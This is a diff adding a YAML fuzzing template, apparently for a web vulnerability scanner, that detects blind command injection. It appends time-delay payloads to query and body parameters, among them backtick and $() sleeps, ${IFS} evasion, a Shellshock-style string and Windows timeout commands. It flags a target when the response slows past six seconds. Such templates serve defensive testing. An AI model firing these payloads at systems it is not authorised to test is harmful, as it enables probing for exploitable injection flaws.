@@ -1,0 +1,39 @@
+id: cmd-inj-fuzz
+type: fuzz
+level: 4
+info:
+  name: Command Injection Fuzzer
+  risk: High
+payloads:
+  - >-
+    `sleep 6`
+  - >-
+    `sleep${IFS}6`
+  - >-
+    $(sleep 6)
+  - >-
+    $(sleep${IFS}6)
+  - >-
+    ;system('Start-Sleep -s 6')
+  - >-
+    ;Start-Sleep -s 6|
+  - >-
+    |C:\Windows\System32\timeout.exe 6
+  - >-
+    |timeout 6|
+  - >-
+    `/usr/bin/sleep 6`
+  - >-
+    ;sleep 6|
+  - >-
+    () { :;}; /bin/bash -c "sleep 6"
+  - >-
+    && FOR /F "delims=" %i IN ('timeout 6') DO echo 1
+
+requests:
+  - generators:
+      - Query("[[.original]]{{.payload}}")
+      - Body("[[.original]]{{.payload}}")
+    detections:
+      - >-
+        ResponseTime() > 6
